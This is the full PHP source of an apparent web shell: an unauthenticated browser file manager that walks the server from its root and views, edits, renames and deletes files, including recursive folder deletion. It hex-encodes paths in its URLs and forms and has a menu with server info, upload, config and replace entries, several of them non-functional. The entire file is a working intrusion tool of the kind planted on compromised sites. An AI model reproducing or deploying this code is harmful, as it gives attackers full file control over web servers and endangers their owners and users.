<?php

set_time_limit(0);
extract(start());
?>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style type="text/css">
    @import url('https://fonts.googleapis.com/css2?family=Inconsolata&display=swap');
    body {
    	margin: 0;
        background: #edf2f7;
    }
    * {
        font-family: 'Inconsolata', monospace;
    }
    td.img {
        width:1px;
    }
    td.act {
        width:150px;
    }
    td {
        /*border:1px solid red;*/
        color: #000;
    }
    td.files {
        width:60%;
    }
    .table {

    }
    table {
        width:100%;
        padding:15px;
        background-color: #fff;
        box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1),0 2px 4px -1px rgba(0, 0, 0, 0.06);
    }
    table.header {
        border-spacing:0;
        border-collapse:collapse;
        width:95%;
        padding:0px;
        border-radius:5px;
        background:none;
        float: right;
        position: fixed;
        overflow: hidden;
    }
    span {
        color: #000;
    }
    button {
    	color: #000;
        outline: none;
        background: transparent;
        border-radius:3px;
        border:1px solid #bababa;
        padding:3px 7px;
    }
    button.other {
        border:none;
    }
    input[type=submit] {
    	border:1px solid #bababa;
        border-radius:5px;
        outline: none;
        padding:5px;
    }
    .header-action {
    	padding:20px;
    	font-size:25px;
    	font-weight: bold;
    	text-align: center;
    }
    textarea {
        border:1px solid #bababa;
        border-radius:5px;
        outline: none;
        resize: none;
        padding:15px;
        width:100%;
        height:400px;
    }
    a {
        text-decoration: none;
        color: #000;
    }
    .icon {
        width:25px;
        height:25px;
    }
    div.nav {
    	width: 100%;
    	overflow: hidden;
    	position: fixed;
    }
    div.pwd {
    	margin-top:30px;
    	padding:20px;
    }
    input[type=text] {
    	border:1px solid #bababa;
        border-radius:5px;
        outline: none;
        padding:5px;
        width:39%;
    }
    .navbar-bottom {
    	overflow: hidden;
  		position: fixed;
  		bottom: 0;
  		background: #fff;
    	border-top: 1px solid #ededed;
        bottom: 0;
        width: 100%;
      }
    .navbar {
    	border-bottom: 1px solid #ededed;
    	width: 80%;
        background: #fff;
        position: fixed;
        top: 0;
        width: 100%;
      }
      .navbar a {
      	overflow: hidden;
        float: left;
        display: block;
        color: #000;
        text-align: center;
        padding: 15px 18px;
        text-decoration: none;
        font-size: 18px;
      }
      .container {
        padding: 18px;
        margin-top: 35px;
        height: 2000px;
      }
      .navbar .icon {
        display: none;
      }
      @media screen and (max-width: 600px) {
        .navbar a:not(:first-child) {
            display: none;
        }
        .navbar a.icon {
            float: right;
            display: block;
        }
     }
     @media screen and (max-width: 600px) {
     	table {
     		margin:0;
     		width:100%;
     	}
     	input[type=submit],
     	input[type=text] {
     		width:100%;
     		padding:5px;
     	}
        .navbar.responsive {position: relative;}
        .navbar.responsive .icon {
            position: fixed;
            right: 0;
            top: 0;
        }
        .size, .time, .perms {
        	display: none;
        }
        button.other {
        	border:none;
        }
        div.nav {
        	
        }
        button {
            padding:5px;
            font-size:17px;
            margin:1;
        }
        .navbar.responsive a.cwd {
        	float: none;
        }
        .navbar.responsive a {
            float: none;
            display: block;
            text-align: left;
        }
        .navbar.responsive .dropdown {float: none;}
        .navbar.responsive .dropdown-content {position: relative;}
        .navbar.responsive .dropdown .dropbtn {
            display: block;
            width: 100%;
            text-align: left;
        }
     }
</style>
<body>
<script>
function myFunction() {
  var x = document.getElementById("myTopnav");
  if (x.className === "navbar") {
    x.className += " responsive";
  } else {
    x.className = "navbar";
  }
}
</script>
<div class="nav">
<form method="post">
	<div class="navbar" id="myTopnav">
		<a href="<?= $home ?>" class="home">Home</a>
		<a>
			<button class="other">server info</button>
		</a>
		<a>
			<button class="other">upload</button>
		</a>
		<a>
			<button class="other">config</button>
		</a>
		<a>
			<button class="other">create file</button>
		</a>
		<a>
			<button class="other">replace</button>
		</a>
		<a href="javascript:void(0);" style="font-size:15px;color:#000;" class="icon" onclick="myFunction()">&#9776;</a>
	</div>
</form>
</div>
<?php
    $_POST['x'] = (isset($_POST['x'])) ? encrypt($_POST['x'],'de') : false;
    $_POST['file'] = (isset($_POST['file'])) ? encrypt($_POST['file'],'de') : false;
    $FILEPATH      = "http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], ' ', $_POST['file']);
    function start(){
        global $_POST,$_GET;
    
        $result['cwd'] = (isset($_GET['x'])) ? encrypt($_GET['x'],'de') : getcwd();
        $result['currentpathen'] = (isset($_GET['x'])) ? $_GET['x'] : encrypt(getcwd(),'en');
        $result['home'] = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
    
        return $result;
    }
    function actionChangename($file, $type) {
    	switch ($type) {
    		case 'dir':
    			?>
    			<tr>
    				<td colspan="3" class="header-action">
    					CHANGE NAME
    				</td>
    			</tr>
    			<tr>
    				<td>
    					<?= @$alert; ?>	
    				</td>
    			</tr>
    			<tr>
    				<td class="act">
    					Filename
    				</td>
    				<td class="img"><center>:</center></td>
    				<td>
    					<?= w__($file, basename($file)) ?>
    				</td>
    			</tr>
    			<tr>
    				<td>
                		Type
            		</td>
            		<td><center>:</center></td>
            		<td>
                		<?= filetype($file) ?>
            		</td>
            	</tr>
            	<tr>
            		<td>
            			Last Modif
            		</td>
            		<td><center>:</center></td>
            		<td>
            			<?= ftime($file) ?>
            		</td>
            	</tr>
            	<form method="post">
            		<td colspan="3">
            			<button onclick="window.location.href='?x=<?= $cwd ?>'">files</button>
                		<button onclick="window.location.href='?x=<?= encrypt($file, 'en') ?>'">open</button>
                		<button name="action" value="delete">delete</button>
                		<button name="action" value="rename" disabled>rename</button>
                		<button name="action" value="chmod">chmod</button>
                		<button>donwload</button>
                	</td>
                	<input type="hidden" name="file" value="<?= encrypt($file, 'en') ?>">
                </form>
            </tr>
            <form method="post">
            	<tr>
            		<td colspan="3">
            			<input type="text" name="newname" value="<?= basename($file) ?>">
            		</td>
            	</tr>
            	<tr>
            		<td colspan="3">
            			<input type="submit" name="submit">
            			<input type="hidden" name="action" value="changename">
            			<input type="hidden" name="file" value="<?= encrypt($file, 'en') ?>">
            		</td>
            	</tr>
            </form>
            <?php
    			break;
    		
    		case 'file':
    			?>
    			<tr>
    				<td colspan="3" class="header-action">
    					CHANGE NAME
    				</td>
    			</tr>
    			<tr>
    				<td>
    					<?= @$alert; ?>	
    				</td>
    			</tr>
    			<tr>
    				<td class="act">
    					Filename
    				</td>
    				<td class="img"><center>:</center></td>
    				<td>
    					<?= w__($file, basename($file)) ?>
    				</td>
    			</tr>
    			<tr>
    				<td>
                		Size
            		</td>
            		<td><center>:</center></td>
            		<td>
                		<?= size($file) ?>
            		</td>
            	</tr>
            	<tr>
            		<td>
            			Last Modif
            		</td>
            		<td><center>:</center></td>
            		<td>
            			<?= ftime($file) ?>
            		</td>
            	</tr>
            	<form method="post">
            		<td colspan="3">
            			<button onclick="window.location.href='?x=<?= $cwd ?>'">files</button>
                		<button onclick="window.location.href='<?= $FILEPATH ?>'">view</button>
                		<button name="action" value="edit">edit</button>
                		<button name="action" value="delete">delete</button>
                		<button name="action" value="rename" disabled>rename</button>
                		<button name="action" value="chmod">chmod</button>
                		<button>donwload</button>
                	</td>
                	<input type="hidden" name="file" value="<?= encrypt($file, 'en') ?>">
                </form>
            </tr>
            <form method="post">
            	<tr>
            		<td colspan="3">
            			<input type="text" name="newname" value="<?= basename($file) ?>">
            		</td>
            	</tr>
            	<tr>
            		<td colspan="3">
            			<input type="submit" name="submit">
            			<input type="hidden" name="action" value="changename">
            			<input type="hidden" name="file" value="<?= encrypt($file, 'en') ?>">
            		</td>
            	</tr>
            </form>
            <?php
            break;
    	}
    }
    function getfiles($type) {
        global $cwd;
        $dir = scandir($cwd);
        $result = array();
        foreach ($dir as $key => $value) {
            $current['fullname'] = $cwd . DIRECTORY_SEPARATOR . $value;
            switch ($type) {
                case 'dir':
                    if (!is_dir($current['fullname']) || $value == '.' || $value == '..') continue 2;
                    break;
                case 'file':
                    if (!is_file($current['fullname'])) continue 2;
                    break;
            }
            $current['name'] = $value;
            $current['link'] = encrypt($current['fullname'], 'en');
            $current['size'] = (is_dir($current['fullname'])) ? @filetype($current['fullname']) : size($current['fullname']);
            $current['time'] = ftime($current['fullname']);
            $current['perm'] = w__($current['fullname'], perms($current['fullname']));
            $result[] = $current;
        } return $result;
    }
    function pwd() {
        global $cwd;
        $path = $cwd;
        $path = str_replace('\\','/',$path);
        $paths = explode('/',$path);
        $result = '';
        foreach ($paths as $id => $value) {
            if($value == '' && $id == 0) {
                $result .= '<a href="?x='.encrypt("/",'en').'">/</a>';
                continue;
            }
            if($value == '') continue;
            $result .= '<a href="?x=';
            $linkpath = '';
            for ($i=0; $i <= $id ; $i++) { 
                $linkpath .= $paths[$i];
                if($i != $id) $linkpath .= "/";
            }
            $result .= encrypt($linkpath,'en');
            $result .=  '">'.$value.'</a>/';
        } return $result;
    }
    function w__($filename, $perms) {
        if (is_writable($filename)) {
            return "<font color='green'>{$perms}</font>";
        } else {
            return "<font color='red'>{$perms}</font>";
        }
    }
    function perms($filename) {
        return substr(sprintf("%o", fileperms($filename)), -4);
    }
    function ftime($filename) {
        return date("F d Y g:i:s", filemtime($filename));
    }
    function changeTime($filename) {
        if (file_exists($filename)) filemtime($filename);
    }
    function size($filename) {
        if (is_file($filename)) {
            $filepath = $filename;
            if (!realpath($filepath)) {
                $filepath = $_SERVER['DOCUMENT_ROOT'] . $filepath;
            }
            $filesize = filesize($filepath);
            $array = array("TB","GB","MB","KB","B");
            $total = count($array);
            while ($total-- && $filesize > 1024) {
                $filesize /= 1024;
            } return round($filesize, 2) . " " . $array[$total];
        } return false;
    }
    function changename($filename, $newname) {
    	global $cwd;
    	return rename($filename, $cwd .DIRECTORY_SEPARATOR. htmlspecialchars($newname));
    }
    function delete($filename) {
        if (is_dir($filename)) {
            $scdir = scandir($filename);
            foreach ($scdir as $key => $value) {
                if ($value != '.' && $value != '..') {
                    if (is_dir($filename . DIRECTORY_SEPARATOR . $value)) {
                        delete($filename . DIRECTORY_SEPARATOR . $value);
                    } else {
                        unlink($filename . DIRECTORY_SEPARATOR . $value);
                    }
                }
            } if (rmdir($filename)) {
                return true;
            } else {
                return false;
            }
        } else {
            if (unlink($filename)) {
                return true;
            } else {
                return false;
            }
        }
    }
    function save($filename, $text, $mode = 'w') {
        global $cwd;
        if (substr($cwd, -1) === DIRECTORY_SEPARATOR) {
            $handle = fopen($filename, $mode);
            changeTime($cwd.DIRECTORY_SEPARATOR.$filename);
            fwrite($handle, $text);
            fclose($handle);
        } else {
            $handle = fopen($filename, $mode);
            changeTime($cwd.DIRECTORY_SEPARATOR.$filename);
            fwrite($handle, $text);
            fclose($handle);
        }
    }
    function getfileimg($file) {
        $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
        switch ($ext) {
            case 'php':
                print("https://image.flaticon.com/icons/png/128/337/337947.png");
                break;
            
            default:
                print("https://image.flaticon.com/icons/svg/833/833524.svg");
                break;
        }
    }
    function encrypt($file, $type) {
        if (function_exists("strlen") && function_exists("dechex") && function_exists("ord") && function_exists("chr") && function_exists("hexdec")) {
            return ($type == 'en') ? hex($file) : unhex($file);
        } 
    }
    function hex($string){
        $hex = '';
        for ($i=0; $i < strlen($string); $i++) {
            $hex .= dechex(ord($string[$i]));
        } return $hex;
    }
    function unhex($hex){
        $string = '';
        for ($i=0; $i < strlen($hex)-1; $i+=2) {
            $string .= chr(hexdec($hex[$i].$hex[$i+1]));
        } return $string;
    }

?>
<table align="center" class="table">
<br><br><br>
<?php
switch (@$_POST['action']) {
	case 'delete':
		delete($_POST['file']);
		break;
	case 'changename':
		if (isset($_POST['submit'])) {
			if (changename($_POST['file'], $_POST['newname'])) {
				$alert = 'success';
			} else {
				$alert = 'failed';
			}
		}
		if (is_dir($_POST['file'])) {
			actionChangename($_POST['file'], 'dir');
		} elseif (is_file($_POST['file'])) {
			actionChangename($_POST['file'], 'file');
		}
		exit();
		break;
    case 'edit':
        if (isset($_POST['submit'])) {
            if (save($_POST['file'], $_POST['text'])) {
                $alert = "failed";
            } else {
                $alert = "saved";
            }
        }
        ?>
        <tr>
            <td colspan="3" class="header-action">
                EDIT
            </td>
        </tr>
        <tr>
            <td>
                <?= @$alert ?>
            </td>
        </tr>
        <tr>
            <td class="act">
                Filename
            </td>
            <td class="img"><center>:</center></td>
            <td>
                <?= w__($_POST['file'], basename($_POST['file'])) ?>
            </td>
        </tr>
        <tr>
            <td>
                Size
            </td>
            <td><center>:</center></td>
            <td>
                <?= size($_POST['file']) ?>
            </td>
        </tr>
        <tr>
            <td>
                Last Modif
            </td>
            <td><center>:</center></td>
            <td>
                <?= ftime($_POST['file']) ?>
            </td>
        </tr>
        <tr>
        <form method="post">
            <td colspan="3">
                <button onclick="window.location.href='?x=<?= $cwd ?>'">files</button>
                <button onclick="window.location.href='<?= $FILEPATH ?>'">view</button>
                <button name="action" value="edit" disabled>edit</button>
                <button name="action" value="delete">delete</button>
                <button name="action" value="changename">rename</button>
                <button name="action" value="chmod">chmod</button>
                <button>donwload</button>
            </td>
            <input type="hidden" name="file" value="<?= encrypt($_POST['file'], 'en') ?>">
        </form>
        </tr>
        <form method="post">
            <tr>
                <td colspan="3">
                    <textarea name="text"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
                </td>
            </tr>
            <tr>
                <td colspan="3">
                    <input type="submit" name="submit">
                    <input type="hidden" name="action" value="edit">
                    <input type="hidden" name="file" value="<?= encrypt($_POST['file'], 'en') ?>">
                </td>
            </tr>
        </form>
        <?php
        exit();
        break;
}

?>
<tr>
	<td colspan="6">
		<center>
			<?= pwd() ?> ( <?= w__($cwd, "writable") ?> )
		</center>
	</td>
</tr>
<?php

foreach (getfiles("dir") as $key => $value) {
    ?>
    <tr>
    	<td class="img">
    		<input type="checkbox" name="data[]" value="<?= $value['fullname'] ?>">
    	</td>
        <td class="img">
            <img class="icon" src="https://image.flaticon.com/icons/svg/716/716784.svg">
        </td>
        <td class="files">
            <a href="?x=<?= $value['link'] ?>"><?= $value['name'] ?></a>
        </td>
        <td class="size">
            <?= $value['size'] ?>
        </td>
        <td class="time">
            <?= $value['time'] ?>
        </td>
        <td class="perms">
            <?= $value['perm'] ?>
        </td>
        <form method="post">
            <td>
                <select name="action" onchange="if(this.value != '0') this.form.submit()">
                    <option selected disabled>action</option>
                    <option value="changename">changename</option>
                    <option value="delete">delete</option>
                </select>
                <input type="hidden" name="file" value="<?= encrypt($value['fullname'], 'en') ?>">
            </td>
        </form>
    </tr>
    <?php
}
foreach (getfiles("file") as $key => $value) {
    ?>
    <tr>
    	<td class="img">
    		<input type="checkbox" name="data[]" value="<?= $value['fullname'] ?>">
    	</td>
        <td class="img">
            <img class="icon" src="<?= getfileimg($value['name']) ?>">
        </td>
        <td class="files">
            <?= $value['name'] ?>
        </td>
        <td class="size">
            <?= $value['size'] ?>
        </td>
        <td class="time">
            <?= $value['time'] ?>
        </td>
        <td class="perms">
            <?= $value['perm'] ?>
        </td>
        <form method="post" action='?x=<?= $currentpathen ?>'>
            <td>
                <select name="action" onchange="if(this.value != '0') this.form.submit()">
                    <option selected disabled>action</option>
                    <option value="edit">edit</option>
                    <option value="changename">changename</option>
                    <option value="delete">delete</option>
                </select>
                <input type="hidden" name="file" value="<?= encrypt($value['fullname'], 'en') ?>">
            </td>
        </form>
    </tr>
    <?php
}
?>
<div class="navbar-bottom">
	<form method="post">
		<select name="">
			<option selected disabled>option</option>
		</select>
	</form>
</div>
</table>
</div>
